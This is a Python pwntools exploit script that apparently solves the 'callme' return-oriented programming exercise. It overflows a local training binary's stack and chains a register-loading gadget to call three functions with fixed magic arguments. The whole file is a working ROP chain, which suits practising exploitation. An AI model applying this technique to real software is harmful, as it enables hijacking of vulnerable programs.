#!/usr/bin/env python3

from pwn import *

# Connect
elf = ELF('./callme')
p = process('./callme')

# Functions and gadgets
callme_one_addr = 0x000000000000400726
callme_two_addr = 0x000000000000400746
callme_three_addr = 0x0000000000004006f6
pop_rdi_rsi_rdx = 0x000000000040093c

# Payload calling gadget 3 times to make it return 3 functions
payload = b'A'*40

payload += p64(pop_rdi_rsi_rdx)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(callme_one_addr)

payload += p64(pop_rdi_rsi_rdx)                                                                                  
payload += p64(0xdeadbeefdeadbeef)                                                                               
payload += p64(0xcafebabecafebabe)                                                                               
payload += p64(0xd00df00dd00df00d)                                                                                
payload += p64(callme_two_addr)

payload += p64(pop_rdi_rsi_rdx)                                                                                   
payload += p64(0xdeadbeefdeadbeef)                                                                               
payload += p64(0xcafebabecafebabe)                                                                                
payload += p64(0xd00df00dd00df00d)                                                                                
payload += p64(callme_three_addr)

p.recvuntil('> ')
p.sendline(payload)

print(p.recvall())
